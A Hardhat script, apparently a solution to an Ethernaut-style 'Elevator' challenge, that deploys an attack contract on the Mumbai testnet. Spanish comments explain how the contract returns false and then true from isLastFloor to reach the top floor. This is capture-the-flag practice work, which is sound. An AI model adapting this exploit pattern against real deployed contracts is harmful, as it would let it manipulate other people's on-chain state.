const BigNumber = require("bignumber.js") // Import the BigNumber library
require("dotenv").config()
const {
  abi: ABIKing,
} = require("../../artifacts/contracts/9/King.sol/King.json")
const _provider = process.env.PROVIDER_MUMBAI
const privateKey = process.env.PRIVATE_KEY

const provider = new ethers.providers.JsonRpcProvider(_provider)
const signer = new ethers.Wallet(privateKey, provider)

/* DEPLOY + ATTACK */
/* @remind Es lioso. Hay que crear un contrat "MyBuilding" que llame a "Elevator" y este volvera a llamar de vuelta a "MyBuilding" */
/* despues, el uint no sirve para nada. ya que se llama dos veces a la funcion isLastFloor(uint) con el mismo parametro uint y
la 1era vez deve devolver false y la segunda vez true
*/
async function main() {
  /* ATTACK CONTRACT NAME */
  const contractToDeploy = "MyBuilding"
  const MyContract = await ethers.getContractFactory(contractToDeploy)
  const MyBuildingContract = await MyContract.deploy()

  const txbefore = await MyBuildingContract.connect(signer).firstFalse()
  console.log("txbefore", txbefore) // output -> false

  /* callElevatorInstance */
  const tx = await MyBuildingContract.connect(signer).callElevatorInstance({
    gasLimit: 10000000,
  })

  const res = await tx.wait()
  if (res.status === 0) {
    console.log("Transaction failed")

    // Retrieve the revert reason from the res if available
    if (res.logs && res.logs.length > 0) {
      const errorLog = res.logs.find((log) => log.topics[0] === "0x08c379a0") // Keccak hash of "Error(string)"
      if (errorLog) {
        const errorData = errorLog.data
        const reason = ethers.utils.toUtf8String(errorData.slice(4)) // Removing the 4-byte selector
        console.log("Revert reason:", reason)
      }
    }
  } else if (res.status === 1) {
    console.log("Transaction succeeded")
  }
  const txafter = await MyBuildingContract.connect(signer).firstFalse()
  console.log("txafter", txafter) // output -> true
}

main()
  .then(async (myContract) => {})
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })

/* 
  npx hardhat run contracts/11/DeployAndCall__Attack.js --network mumbai
*/
